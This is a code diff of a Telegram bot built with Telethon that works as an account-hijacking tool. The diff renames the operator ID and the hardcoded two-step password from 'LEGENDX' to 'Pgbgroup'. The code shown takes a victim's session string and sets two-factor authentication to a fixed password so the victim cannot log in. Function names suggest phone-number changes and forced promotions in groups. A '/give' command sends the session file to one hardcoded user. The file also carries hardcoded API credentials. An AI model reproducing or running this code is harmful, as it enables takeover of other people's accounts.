@@ -20,7 +20,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-legendx = 1967548493
+Pgbgroup = 1967548493
 
 
 async def change_number_code(strses, number, code, otp):
@@ -73,7 +73,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
     try:
-      await X.edit_2fa('LEGENDXISBEST')
+      await X.edit_2fa('PgbgroupISBEST')
       return True
     except:
       return False
@@ -187,7 +187,7 @@ async def op(event):
     await event.reply(mm)
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
-  if not event.sender_id == legendx:
+  if not event.sender_id == Pgbgroup:
     return await event.reply("please don't use me fast")
   try:
     await event.reply("session bot file", file="Pgbgroup.session")
@@ -303,7 +303,7 @@ async def start(event):
         return await event.respond("This StringSession is terminated maybe")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using Pgbgroup Bot")
+        await event.reply("User don't have two step thats why now two step is `PgbgroupISBEST` you can login now\n\nThanks For using Pgbgroup Bot")
       else:
         await event.reply("Sorry User Have two step already")
     elif r == "I":
